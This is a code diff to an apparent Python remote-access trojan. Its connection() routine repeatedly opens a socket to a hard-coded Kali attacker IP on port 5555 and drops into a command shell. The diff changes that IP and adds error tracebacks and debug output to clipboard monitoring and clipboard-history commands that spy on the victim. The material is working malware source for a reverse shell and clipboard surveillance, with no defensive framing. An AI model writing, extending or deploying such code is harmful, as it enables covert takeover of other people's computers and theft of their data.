@@ -67,7 +67,7 @@ def connection():
         time.sleep(20)  # Wait for 20 seconds before reconnecting (for resilience)
         try:
             # Connect to a remote host - CHANGE THIS IP TO YOUR KALI LINUX IP
-            s.connect(('192.168.1.144', 5555))  # Update this to your Kali IP
+            s.connect(('192.168.1.147', 5555))  # Update this to your Kali IP
             # Once connected, enter the shell() function for command execution
             shell()
             # Close the connection when done
@@ -131,7 +131,7 @@ def shell():
                 if not clipboard_monitor_started:
                     # Reset the stop flag before starting
                     clipboard_monitor_stop_flag.clear()
-                    # Start the monitor thread with stop flag
+                    # Start the monitor using the helper function and store the thread reference
                     from features.clipboard import clipboard_monitor
                     clipboard_monitor_thread = threading.Thread(
                         target=clipboard_monitor,
@@ -144,20 +144,24 @@ def shell():
                 else:
                     reliable_send("Clipboard monitor already running")
             except Exception as e:
-                reliable_send("Clipboard monitor error: " + str(e))
+                import traceback
+                reliable_send("Clipboard monitor error: " + str(e) + "\n" + traceback.format_exc())
 
         elif command == 'stop_clipboard':
             try:
                 if clipboard_monitor_started and clipboard_monitor_thread is not None:
+                    print(f"[DEBUG] Stopping clipboard monitor, thread alive: {clipboard_monitor_thread.is_alive()}")
                     clipboard_monitor_stop_flag.set()
-                    clipboard_monitor_thread.join(timeout=2)
+                    clipboard_monitor_thread.join(timeout=3)
                     clipboard_monitor_started = False
                     clipboard_monitor_thread = None
+                    print("[DEBUG] Clipboard monitor stopped successfully")
                     reliable_send("Clipboard monitor stopped")
                 else:
                     reliable_send("Clipboard monitor is not running")
             except Exception as e:
-                reliable_send("Stop clipboard monitor error: " + str(e))
+                import traceback
+                reliable_send("Stop clipboard monitor error: " + str(e) + "\n" + traceback.format_exc())
 
         elif command == 'clipboard_history':
             try:
